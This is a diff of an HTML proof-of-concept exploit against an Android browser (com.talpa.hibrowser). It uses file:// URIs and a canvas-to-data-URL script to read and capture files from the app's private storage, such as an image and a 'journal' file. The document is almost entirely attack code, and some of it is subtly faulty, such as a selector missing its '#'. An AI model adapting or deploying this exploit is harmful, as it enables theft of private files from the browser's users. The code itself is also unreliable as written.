@@ -1,12 +1,12 @@
 <html>
   <h1>Hello this is a sample exploit ! </h1>
   <body>
-<img src='file://///storage/emulated/0/Android/data/com.talpa.hibrowser/files/image/9.png'>
+<img id='steal' src='file://///storage/emulated/0/Android/data/com.talpa.hibrowser/files/image/9.png'>
     <object id="ObjAlertePageLogin" width="300" height="100" type="text/plain" data="file:///storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" border="0" style="overflow: hidden;"> 
     <embed src="file:///storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" type="text/plain" />
     </object>
     <script>
-      function getDataUrl('file://///storage/emulated/0/Android/data/com.talpa.hibrowser/files/image/9.png') {
+      function getDataUrl(img) {
    // Create canvas
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
@@ -18,7 +18,7 @@
    return canvas.toDataURL('image/png');
 }
 // Select the image
-const img = document.querySelector('#my-image');
+const img = document.querySelector('steal');
 img.addEventListener('load', function (event) {
    const dataUrl = getDataUrl(event.currentTarget);
    console.log(dataUrl);
